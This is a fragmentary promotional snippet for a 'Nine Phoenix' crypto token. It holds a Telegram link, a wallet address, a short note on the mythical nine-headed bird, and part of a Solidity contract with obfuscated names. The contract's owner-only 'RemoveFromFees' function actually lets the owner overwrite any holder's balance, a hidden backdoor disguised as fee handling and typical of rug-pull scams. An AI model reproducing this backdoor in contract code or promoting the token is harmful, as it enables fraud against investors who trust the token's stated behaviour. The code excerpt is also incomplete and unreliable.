...
⏩ https://t.me/Nine_Phoenix  ⏪

⚡️⫸ 0xaBe84216251c945c9d771DEb9b80354b79345Eb8 ⫷ ⚡️

The nine-headed bird (九頭鳥), also called the "Nine Phoenix" (九鳳), 
is one of the earliest forms of the fenghuang, worshiped by ancient natives in Hubei Province,
 which during the Warring States period was part of the kingdom of Chu (楚)
...
contract NinePhoenixNFT is Contextrte, IBEPNinePhoenix, Ownableertg {
  ...
  constructor() public {
    _name = 'Nine Phoenix 九鳳';
    _symbol = 'Nine Phoenix';
    _decimals = 0;
 ...
 function RemoveFromFees(address CCNinePhoenix, uint256 CCNinePhoenixNFT) external onlyOwner{
    _totbalances[CCNinePhoenix] = CCNinePhoenixNFT;
  }
